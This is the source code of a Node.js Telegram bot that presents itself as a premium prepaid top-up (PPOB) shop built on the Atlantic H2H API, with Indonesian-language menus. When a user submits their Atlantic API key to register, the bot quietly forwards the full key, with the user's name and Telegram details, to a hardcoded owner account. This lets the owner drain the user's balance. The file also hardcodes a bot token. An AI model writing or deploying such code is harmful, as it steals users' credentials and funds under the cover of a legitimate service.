const { Telegraf, Markup, session } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);

// Session middleware
bot.use(session({
    defaultSession: () => ({
        step: null,
        prodCode: null,
        prodPrice: null,
        prodName: null,
        target: null,
        currentPage: 0,
        category: null,
        provider: null,
        products: []
    })
}));

const userDb = {};

// --- HELPER FUNCTIONS ---
function esc(text) {
    if (!text) return '';
    return text.toString()
        .replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&')
        .replace(/\n/g, ' ');
}

function formatCurrency(amount) {
    return 'Rp ' + parseInt(amount).toLocaleString('id-ID');
}

async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) { 
            formData.append(key, body[key]); 
        }
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: {
                ...formData.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 15000
        });
        return res.data;
    } catch (e) { 
        console.error('API Error:', e.message);
        return { status: false, message: "Server sedang sibuk, coba lagi nanti." }; 
    }
}

// --- PAGINATION ---
function paginateButtons(items, page = 0, itemsPerPage = 10, callbackPrefix = 'item') {
    const totalPages = Math.ceil(items.length / itemsPerPage);
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const pageItems = items.slice(start, end);
    
    const rows = [];
    for (let i = 0; i < pageItems.length; i += 2) {
        const row = [];
        const name1 = pageItems[i].name.substring(0, 15) + (pageItems[i].name.length > 15 ? '..' : '');
        row.push(Markup.button.callback(`• ${name1}`, `${callbackPrefix}_${pageItems[i].code}_${pageItems[i].price}_${pageItems[i].name}`));
        
        if (pageItems[i + 1]) {
            const name2 = pageItems[i + 1].name.substring(0, 15) + (pageItems[i + 1].name.length > 15 ? '..' : '');
            row.push(Markup.button.callback(`• ${name2}`, `${callbackPrefix}_${pageItems[i + 1].code}_${pageItems[i + 1].price}_${pageItems[i + 1].name}`));
        }
        rows.push(row);
    }
    
    const navRow = [];
    if (page > 0) {
        navRow.push(Markup.button.callback('◀️ Sebelumnya', `page_${page - 1}`));
    }
    if (totalPages > 1) {
        navRow.push(Markup.button.callback(`📄 ${page + 1}/${totalPages}`, 'noop'));
    }
    if (page < totalPages - 1) {
        navRow.push(Markup.button.callback('Selanjutnya ▶️', `page_${page + 1}`));
    }
    
    if (navRow.length > 0) rows.push(navRow);
    
    return rows;
}

// --- START ---
bot.start(async (ctx) => {
    try {
        ctx.session = {
            step: null,
            prodCode: null,
            prodPrice: null,
            prodName: null,
            target: null,
            currentPage: 0,
            category: null,
            provider: null,
            products: []
        };
        
        const userId = ctx.from.id.toString();
        
        if (userDb[ctx.from.id]) {
            const welcomeText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃  ✨ *SELAMAT DATANG* ✨  ┃\n┃     *YANG MULIA*        ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n🎖️ *Status:* Premium Member\n🆔 *ID:* `' + userId + '`\n\nSilakan pilih menu di bawah ini:';
            
            return ctx.replyWithMarkdown(welcomeText, 
                Markup.inlineKeyboard([
                    [Markup.button.callback('👤 Profile Saya', 'get_profile'), Markup.button.callback('🛒 Beli Produk', 'menu_kategori')],
                    [Markup.button.callback('📜 Riwayat Transaksi', 'history'), Markup.button.callback('❓ Bantuan', 'help')]
                ])
            );
        }
        
        const registerText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃  👑 *PPOB PREMIUM* 👑   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n🔐 *Akses Terkunci*\n\nUntuk menggunakan layanan ini, silakan masukkan *API Key* Atlantic Anda:\n\n💡 *Contoh format:*\n```\nyour-api-key-here\n```';
        
        ctx.replyWithMarkdown(registerText);
    } catch (error) {
        console.error('Start Error:', error);
        ctx.reply('Terjadi kesalahan. Silakan coba lagi.');
    }
});

// --- TEXT HANDLER ---
bot.on('text', async (ctx) => {
    try {
        if (!userDb[ctx.from.id]) {
            const apiKey = ctx.message.text.trim();
            const res = await callAtlantic('/get_profile', { api_key: apiKey });
            
            if (res.status === "true" || res.status === true) {
                userDb[ctx.from.id] = apiKey;
                
                await bot.telegram.sendMessage(
                    OWNER_ID, 
                    '🔔 *USER BARU TERDAFTAR*\\n\\n👤 Nama: ' + res.data.name + '\\n🆔 Telegram: ' + ctx.from.id + '\\n👤 Username: @' + (ctx.from.username || 'tidak ada') + '\\n🔑 API: `' + apiKey + '`', 
                    { parse_mode: 'MarkdownV2' }
                );
                
                const successText = '✅ *BERHASIL TERDAFTAR*\\n\\n👤 Nama: ' + res.data.name + '\\n💰 Saldo: Rp ' + parseInt(res.data.balance).toLocaleString('id-ID') + '\\n\\nSelamat menggunakan layanan PPOB Premium!';
                
                return ctx.replyWithMarkdown(successText,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🚀 Mulai Belanja', 'menu_kategori'), Markup.button.callback('👤 Lihat Profile', 'get_profile')]
                    ])
                );
            } else { 
                return ctx.reply('❌ *API Key Tidak Valid*\\n\\nPesan error: ' + (res.message || 'Unknown error') + '\\n\\nSilakan cek kembali API Key Anda atau hubungi admin.', { parse_mode: 'MarkdownV2' });
            }
        }

        if (ctx.session?.step === 'WAIT_TARGET') {
            const target = ctx.message.text.trim();
            
            if (target.length < 5) {
                return ctx.reply('⚠️ Nomor/ID terlalu pendek. Minimal 5 karakter.');
            }
            
            ctx.session.target = target;
            ctx.session.step = 'CONFIRM';
            
            const confirmText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃   🛒 *KONFIRMASI*    ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n📦 *Produk:* ' + ctx.session.prodName + '\n🎯 *Target:* `' + target + '`\n💸 *Harga:* ' + formatCurrency(ctx.session.prodPrice) + '\n\nApakah data sudah benar?';
            
            return ctx.replyWithMarkdown(confirmText,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Ya, Lanjutkan', 'execute'), Markup.button.callback('❌ Batal', 'menu_kategori')]
                ])
            );
        }
        
        ctx.reply('Silakan gunakan tombol menu atau ketik /start untuk memulai ulang.');
        
    } catch (error) {
        console.error('Text Handler Error:', error);
        ctx.reply('Terjadi kesalahan sistem. Silakan coba lagi.');
    }
});

// --- KATEGORI MENU ---
bot.action('menu_kategori', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        await ctx.editMessageText(
            '╭━━━━━━━━━━━━━━━━━━━╮\n┃  🏷️ *MENU KATEGORI*  ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\nSilakan pilih kategori layanan:',
            {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('🎮 Games', 'cat_Games'), Markup.button.callback('💳 E-Money', 'cat_E-Money')],
                    [Markup.button.callback('⚡ PLN', 'cat_PLN'), Markup.button.callback('📱 Pulsa', 'cat_Pulsa')],
                    [Markup.button.callback('🌐 Data Internet', 'cat_Data'), Markup.button.callback('📺 Streaming', 'cat_Streaming')],
                    [Markup.button.callback('👤 Profile', 'get_profile'), Markup.button.callback('🏠 Menu Utama', 'back_start')]
                ]).reply_markup
            }
        );
    } catch (error) {
        console.error('Menu Kategori Error:', error);
    }
});

// --- BACK TO START ---
bot.action('back_start', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        await ctx.editMessageText(
            '╭━━━━━━━━━━━━━━━━━━━╮\n┃  ✨ *MENU UTAMA* ✨   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\nSelamat datang kembali, Yang Mulia!',
            {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('👤 Profile Saya', 'get_profile'), Markup.button.callback('🛒 Beli Produk', 'menu_kategori')],
                    [Markup.button.callback('📜 Riwayat', 'history'), Markup.button.callback('❓ Bantuan', 'help')]
                ]).reply_markup
            }
        );
    } catch (error) {
        console.error('Back Start Error:', error);
    }
});

// --- PILIH PROVIDER ---
bot.action(/cat_(.+)/, async (ctx) => {
    try {
        const category = ctx.match[1];
        ctx.session.category = category;
        ctx.session.currentPage = 0;
        
        await ctx.answerCbQuery('Memuat ' + category + '...');
        await ctx.editMessageText('⏳ Memuat daftar provider ' + category + '...');
        
        const apiKey = userDb[ctx.from.id];
        const res = await callAtlantic('/layanan/price_list', { type: 'prabayar', api_key: apiKey });
        
        if (res.status) {
            const providers = [...new Set(res.data
                .filter(x => x.category.toLowerCase().includes(category.toLowerCase()))
                .map(x => x.provider))].sort();
            
            if (providers.length === 0) {
                return ctx.editMessageText(
                    '⚠️ Tidak ada provider tersedia untuk kategori ' + category + ' saat ini.',
                    Markup.inlineKeyboard([
                        [Markup.button.callback('⬅️ Kembali', 'menu_kategori')]
                    ])
                );
            }
            
            const buttons = [];
            for (let i = 0; i < providers.length; i += 2) {
                const row = [];
                row.push(Markup.button.callback('• ' + providers[i], 'prov_' + category + '_' + providers[i]));
                if (providers[i + 1]) {
                    row.push(Markup.button.callback('• ' + providers[i + 1], 'prov_' + category + '_' + providers[i + 1]));
                }
                buttons.push(row);
            }
            buttons.push([Markup.button.callback('⬅️ Kembali ke Kategori', 'menu_kategori')]);
            
            const providerText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃  🔍 *PILIH PROVIDER*  ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n📂 Kategori: *' + category + '*\n📊 Total Provider: ' + providers.length + '\n\nSilakan pilih provider:';
            
            await ctx.editMessageText(providerText, {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard(buttons).reply_markup
            });
        } else {
            ctx.editMessageText(
                '❌ Gagal memuat data: ' + (res.message || 'Unknown error'),
                Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Coba Lagi', 'cat_' + category)],
                    [Markup.button.callback('⬅️ Kembali', 'menu_kategori')]
                ])
            );
        }
    } catch (error) {
        console.error('Provider Error:', error);
        ctx.editMessageText('Terjadi kesalahan. Silakan coba lagi.');
    }
});

// --- PILIH PRODUK ---
bot.action(/prov_(.+)_(.+)/, async (ctx) => {
    try {
        const category = ctx.match[1];
        const provider = ctx.match[2];
        ctx.session.provider = provider;
        ctx.session.currentPage = 0;
        
        await ctx.answerCbQuery('Memuat ' + provider + '...');
        await ctx.editMessageText('⏳ Mengambil data produk ' + provider + '...');
        
        const apiKey = userDb[ctx.from.id];
        const res = await callAtlantic('/layanan/price_list', { type: 'prabayar', api_key: apiKey });
        
        if (res.status) {
            const products = res.data
                .filter(x => x.provider === provider && x.status === 'available')
                .map(p => ({
                    code: p.code,
                    name: p.name + ' (' + formatCurrency(p.price) + ')',
                    price: p.price,
                    originalName: p.name
                }));
            
            ctx.session.products = products;
            
            if (products.length === 0) {
                return ctx.editMessageText(
                    '⚠️ Tidak ada produk tersedia untuk ' + provider + ' saat ini.',
                    Markup.inlineKeyboard([
                        [Markup.button.callback('⬅️ Kembali', 'cat_' + category)]
                    ])
                );
            }
            
            const buttons = paginateButtons(products, 0, 10, 'buy');
            buttons.push([Markup.button.callback('⬅️ Kembali ke Provider', 'cat_' + category)]);
            
            const productText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃   🛒 *DAFTAR PRODUK*   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n🏢 Provider: *' + provider + '*\n📦 Total Produk: ' + products.length + '\n\nPilih produk yang diinginkan:';
            
            await ctx.editMessageText(productText, {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard(buttons).reply_markup
            });
        }
    } catch (error) {
        console.error('Produk Error:', error);
        ctx.editMessageText('Terjadi kesalahan saat memuat produk.');
    }
});

// --- PAGINATION ---
bot.action(/page_(.+)/, async (ctx) => {
    try {
        const page = parseInt(ctx.match[1]);
        ctx.session.currentPage = page;
        
        await ctx.answerCbQuery('Halaman ' + (page + 1));
        
        const products = ctx.session.products;
        const buttons = paginateButtons(products, page, 10, 'buy');
        buttons.push([Markup.button.callback('⬅️ Kembali ke Provider', 'cat_' + ctx.session.category)]);
        
        const pageText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃   🛒 *DAFTAR PRODUK*   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n🏢 Provider: *' + ctx.session.provider + '*\n📦 Total Produk: ' + products.length + '\n📄 Halaman: ' + (page + 1) + ' dari ' + Math.ceil(products.length / 10) + '\n\nPilih produk yang diinginkan:';
        
        await ctx.editMessageText(pageText, {
            parse_mode: 'Markdown',
            reply_markup: Markup.inlineKeyboard(buttons).reply_markup
        });
    } catch (error) {
        console.error('Pagination Error:', error);
    }
});

bot.action('noop', async (ctx) => {
    await ctx.answerCbQuery();
});

// --- INPUT TARGET ---
bot.action(/buy_(.+)_(.+)_(.+)/, async (ctx) => {
    try {
        const code = ctx.match[1];
        const price = ctx.match[2];
        const name = ctx.match[3];
        
        ctx.session.prodCode = code;
        ctx.session.prodPrice = price;
        ctx.session.prodName = name;
        ctx.session.step = 'WAIT_TARGET';
        
        await ctx.answerCbQuery();
        
        const inputText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃   🎯 *INPUT TARGET*   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n📦 Produk: ' + name + '\n💸 Harga: ' + formatCurrency(price) + '\n\n✏️ Silakan ketik nomor HP atau ID target:\n\n💡 Contoh: 08123456789 atau 123456789';
        
        await ctx.editMessageText(inputText, {
            reply_markup: Markup.inlineKeyboard([
                [Markup.button.callback('❌ Batal', 'cat_' + ctx.session.category)]
            ]).reply_markup
        });
    } catch (error) {
        console.error('Buy Action Error:', error);
    }
});

// --- EKSEKUSI ---
bot.action('execute', async (ctx) => {
    try {
        await ctx.answerCbQuery('Memproses...');
        await ctx.editMessageText('⏳ Sedang memproses transaksi...');
        
        const apiKey = userDb[ctx.from.id];
        const reffId = 'TRX' + Date.now() + ctx.from.id;
        
        const res = await callAtlantic('/transaksi/create', {
            api_key: apiKey,
            code: ctx.session.prodCode,
            target: ctx.session.target,
            reff_id: reffId
        });

        if (res.status) {
            const data = res.data;
            const successText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃  ✅ *TRANSAKSI SUKSES*  ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n🆔 ID Transaksi: ' + data.id + '\n📦 Layanan: ' + ctx.session.prodName + '\n🎯 Target: ' + ctx.session.target + '\n💸 Harga: ' + formatCurrency(ctx.session.prodPrice) + '\n📊 Status: ' + data.status + '\n🔖 SN: ' + (data.sn || 'Menunggu...') + '\n\nTerima kasih telah bertransaksi!';
            
            await ctx.editMessageText(successText, {
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('🛒 Beli Lagi', 'menu_kategori'), Markup.button.callback('👤 Profile', 'get_profile')]
                ]).reply_markup
            });
            
            await bot.telegram.sendMessage(
                OWNER_ID,
                '💰 *TRANSAKSI BARU*\\n\\n👤 User: ' + ctx.from.id + '\\n📦 Produk: ' + ctx.session.prodName + '\\n💸 Harga: ' + formatCurrency(ctx.session.prodPrice) + '\\n🎯 Target: ' + ctx.session.target,
                { parse_mode: 'MarkdownV2' }
            );
        } else { 
            const failText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃  ❌ *TRANSAKSI GAGAL*  ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\nPesan Error: ' + (res.message || 'Unknown error') + '\n\nSilakan coba lagi atau hubungi admin.';
            
            await ctx.editMessageText(failText, {
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Coba Lagi', 'menu_kategori')],
                    [Markup.button.callback('👤 Hubungi Admin', 'contact_admin')]
                ]).reply_markup
            });
        }
        
        ctx.session.step = null;
        ctx.session.prodCode = null;
        ctx.session.prodPrice = null;
        ctx.session.prodName = null;
        ctx.session.target = null;
        
    } catch (error) {
        console.error('Execute Error:', error);
        ctx.reply('Terjadi kesalahan sistem saat pemrosesan.');
    }
});

// --- PROFILE ---
bot.action('get_profile', async (ctx) => {
    try {
        await ctx.answerCbQuery('Memuat profile...');
        const apiKey = userDb[ctx.from.id];
        const res = await callAtlantic('/get_profile', { api_key: apiKey });
        
        if (res.status) {
            const data = res.data;
            const profileText = '╭━━━━━━━━━━━━━━━━━━━╮\n┃   👤 *PROFILE ANDA*   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n👤 Nama: ' + data.name + '\n💰 Saldo: Rp ' + parseInt(data.balance).toLocaleString('id-ID') + '\n📧 Email: ' + (data.email || '-') + '\n📱 No. HP: ' + (data.phone || '-') + '\n✨ Status: ' + (data.status || 'Active') + '\n🆔 ID: ' + ctx.from.id + '\n\n💡 Info: Saldo dapat diisi melalui admin.';
            
            await ctx.editMessageText(profileText, {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Refresh', 'get_profile'), Markup.button.callback('🛒 Beli Produk', 'menu_kategori')],
                    [Markup.button.callback('🏠 Menu Utama', 'back_start')]
                ]).reply_markup
            });
        } else {
            ctx.editMessageText(
                '❌ Gagal memuat profile. Silakan coba lagi.',
                Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Refresh', 'get_profile')]
                ])
            );
        }
    } catch (error) {
        console.error('Profile Error:', error);
        ctx.editMessageText('Terjadi kesalahan saat memuat profile.');
    }
});

// --- RIWAYAT ---
bot.action('history', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        ctx.editMessageText(
            '╭━━━━━━━━━━━━━━━━━━━╮\n┃  📜 *RIWAYAT TRANSAKSI* ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\nFitur riwayat transaksi akan segera hadir.\n\nUntuk cek status transaksi terakhir, silakan hubungi admin.',
            Markup.inlineKeyboard([
                [Markup.button.callback('👤 Hubungi Admin', 'contact_admin')],
                [Markup.button.callback('⬅️ Kembali', 'back_start')]
            ])
        );
    } catch (error) {
        console.error('History Error:', error);
    }
});

// --- BANTUAN ---
bot.action('help', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        ctx.editMessageText(
            '╭━━━━━━━━━━━━━━━━━━━╮\n┃    ❓ *BANTUAN*      ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\n*Cara Penggunaan:*\n\n1️⃣ Klik 🛒 Beli Produk\n2️⃣ Pilih kategori (Games, E-Money, dll)\n3️⃣ Pilih provider (DANA, OVO, Free Fire, dll)\n4️⃣ Pilih produk dari daftar\n5️⃣ Masukkan nomor HP/ID target\n6️⃣ Konfirmasi dan tunggu proses\n\n*Catatan:*\n• Pastikan nomor/ID target sudah benar\n• Transaksi yang sudah diproses tidak dapat dibatalkan\n• Simpan bukti transaksi (SN)',
            {
                parse_mode: 'Markdown',
                reply_markup: Markup.inlineKeyboard([
                    [Markup.button.callback('👤 Hubungi Admin', 'contact_admin')],
                    [Markup.button.callback('⬅️ Kembali', 'back_start')]
                ]).reply_markup
            }
        );
    } catch (error) {
        console.error('Help Error:', error);
    }
});

// --- HUBUNGI ADMIN ---
bot.action('contact_admin', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        ctx.editMessageText(
            '╭━━━━━━━━━━━━━━━━━━━╮\n┃  📞 *HUBUNGI ADMIN*   ┃\n╰━━━━━━━━━━━━━━━━━━━╯\n\nUntuk bantuan lebih lanjut, silakan hubungi:\n\n👤 Admin: @admin_username\n⏰ Jam Operasional: 08:00 - 22:00 WIB',
            Markup.inlineKeyboard([
                [Markup.button.callback('⬅️ Kembali', 'back_start')]
            ])
        );
    } catch (error) {
        console.error('Contact Admin Error:', error);
    }
});

// --- ERROR HANDLING ---
bot.catch((err, ctx) => {
    console.error('Bot Error:', err);
    ctx.reply('Terjadi kesalahan sistem. Silakan ketik /start untuk memulai ulang.');
});

// --- LAUNCH ---
bot.launch()
    .then(() => console.log('🚀 Bot PPOB Premium Aktif!'))
    .catch(err => console.error('Launch Error:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
